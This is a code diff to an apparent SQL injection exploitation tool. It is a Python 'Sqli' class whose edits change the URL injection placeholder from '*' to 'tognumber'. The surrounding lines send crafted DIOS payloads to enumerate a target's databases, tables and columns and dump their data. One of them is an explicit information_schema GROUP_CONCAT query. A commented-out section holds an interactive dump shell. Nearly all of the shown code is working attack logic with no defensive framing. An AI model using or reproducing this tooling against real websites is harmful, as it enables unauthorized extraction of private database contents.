@@ -29,7 +29,7 @@ class Sqli:
 
     def information(self, level=1):
         dios = Dios().get_information()
-        response = requests.get(self.url.replace('*',dios))
+        response = requests.get(self.url.replace('tognumber',dios))
         if level == 1:
             try:
                 sqli_helper = self.get_result(response.text)
@@ -84,7 +84,7 @@ class Sqli:
         if level==1:
             query           = Dios().dump_data(tables, columns, self.dbname)
             query_builder   = Dios().build(query)
-            response        = requests.get(self.url.replace('*',query_builder))
+            response        = requests.get(self.url.replace('tognumber',query_builder))
             # try:
             result          = self.get_result(response.text)
             
@@ -108,7 +108,7 @@ class Sqli:
         if level==1:
             query = Dios().databases()
             query_builder = Dios().build(query)
-            r = requests.get(self.url.replace('*', query_builder))
+            r = requests.get(self.url.replace('tognumber', query_builder))
             result = self.get_result(r.text)
             return result.split(',')
 
@@ -116,7 +116,7 @@ class Sqli:
         database = Dios().strTohex(dbname)
         query = Dios().build(f"(SELECT+GROUP_CONCAT(DISTINCT(table_schema))+FROM+information_schema.columns+WHERE+table_schema=0x{database})")
         try:
-            r = requests.get(self.url.replace('*', query))
+            r = requests.get(self.url.replace('tognumber', query))
             res = self.get_result(r.text)
 
             self.dbname = dbname
@@ -126,7 +126,7 @@ class Sqli:
             return ([f'Unknown Database : {dbname}'], False, "NONE")
 
     def tables(self):
-        r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
+        r       = requests.get(self.url.replace('tognumber', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
         output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
 
         if output != None:
@@ -143,7 +143,7 @@ class Sqli:
         # table   = 
         try:
             query_builder = Dios().build(Dios().show_columns(table_name, self.dbname))
-            r       = requests.get(self.url.replace('*', query_builder))
+            r       = requests.get(self.url.replace('tognumber', query_builder))
 
             result  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
             if result != None:
@@ -165,14 +165,14 @@ class Sqli:
     #     domain = re.search(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', self.url)[0]
 
     #     try:
-    #         response    = requests.get(self.url.replace('*',user))
+    #         response    = requests.get(self.url.replace('tognumber',user))
     #         sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
     #         user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
     #         user        = user.group(1)
             # cmd         = input("\033[91m┌["+ user.replace('@', '\033[93m@\033[96m') +"\033[91m]~[\033[32m"+ domain +"\033[91m]\n\033[91m└\033[93m#\033[97m ")
 
             # if cmd == "dump_data":
-            #     r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
+            #     r           = requests.get(self.url.replace('tognumber', Dios().build(self.dios)))
             #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
 
             #     if re.search("<br>", output):
@@ -181,7 +181,7 @@ class Sqli:
             #             print(result)
             #         self.command_line()
             # elif cmd == "show dbs":
-            #     r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
+            #     r           = requests.get(self.url.replace('tognumber', Dios().build(self.show_dbs)))
             #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
 
             #     print("[\033[92m+\033[97m] Database : ")
@@ -192,7 +192,7 @@ class Sqli:
             #     self.command_line()
             # elif re.search("use (.*)", cmd):
             #     dbname  = re.search('use (.*)', cmd).group(1)
-            #     r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(dbname) + ")")))
+            #     r       = requests.get(self.url.replace('tognumber', Dios().build(self.show_tables + Dios().strTohex(dbname) + ")")))
             #     output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
 
             #     if output != None:
@@ -205,7 +205,7 @@ class Sqli:
             #     if not self.dbname:
             #         print("\n[\033[91m-\033[97m] No database selected!\n")
             #     else:
-            #         r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
+            #         r       = requests.get(self.url.replace('tognumber', Dios().build(self.show_tables + Dios().strTohex(self.dbname) + ")")))
             #         output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
 
             #         if output != None:
@@ -218,7 +218,7 @@ class Sqli:
             #     self.command_line()
             # elif re.search("show columns (.*)", cmd):
             #     table   = re.search('show columns (.*)', cmd).group(1)
-            #     r       = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
+            #     r       = requests.get(self.url.replace('tognumber', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
             #     output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
             #     if output != None:
             #         print(f"[\033[92m+\033[97m] Columns from table {table} : ")
@@ -227,7 +227,7 @@ class Sqli:
             #             print(f"└[\033[92m•\033[97m] {column}")
             #     self.command_line()
             # else:
-            #     r           = requests.get(self.url.replace('*', Dios().build(cmd)))
+            #     r           = requests.get(self.url.replace('tognumber', Dios().build(cmd)))
             #     output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
             #     print(f"\n[+] Output : {output}\n")
             # self.command_line()
